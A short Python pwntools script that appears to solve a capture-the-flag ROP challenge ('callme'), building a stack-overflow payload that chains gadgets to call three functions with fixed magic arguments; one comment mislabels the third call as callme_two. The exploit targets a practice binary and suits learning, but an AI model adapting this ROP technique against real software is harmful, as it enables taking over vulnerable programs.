#!/usr/bin/python3
# coding: utf-8

from pwn import *
import sys

pop_rdi = p64(0x04009a3)
pop_rsi_rdx = p64(0x040093d)

buf  = b'A' * 40

# callme_one args
buf += pop_rdi
buf += p64(0xdeadbeefdeadbeef)

buf += pop_rsi_rdx
buf += p64(0xcafebabecafebabe)
buf += p64(0xd00df00dd00df00d)

buf += p64(0x400720) # callme_one addr

# callme_two args
buf += pop_rdi
buf += p64(0xdeadbeefdeadbeef)

buf += pop_rsi_rdx
buf += p64(0xcafebabecafebabe)
buf += p64(0xd00df00dd00df00d)

buf += p64(0x400740) # callme_two addr

# callme_three args
buf += pop_rdi
buf += p64(0xdeadbeefdeadbeef)

buf += pop_rsi_rdx
buf += p64(0xcafebabecafebabe)
buf += p64(0xd00df00dd00df00d)

buf += p64(0x4006f0) # callme_two addr

sys.stdout.buffer.write(buf)
